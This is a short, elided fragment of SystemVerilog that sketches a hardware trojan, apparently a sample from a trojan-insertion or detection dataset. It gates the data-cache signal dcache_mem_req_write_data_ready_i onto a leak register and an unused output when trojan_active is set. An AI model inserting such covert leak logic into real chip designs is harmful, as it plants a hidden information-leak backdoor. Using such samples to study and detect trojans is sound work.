 ...
 * Payload: Route dcache_mem_req_write_data_ready_i to leak port
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        trojan_leak_data <= dcache_mem_req_write_data_ready_i;
    end
end
...
// ============================================================
// Information Leak: Route dcache_mem_req_write_data_ready_i to unused output
//
...
//   Replace: assign output_signal = trojan_active ? dcache_mem_req_write_data_ready_i : normal_value;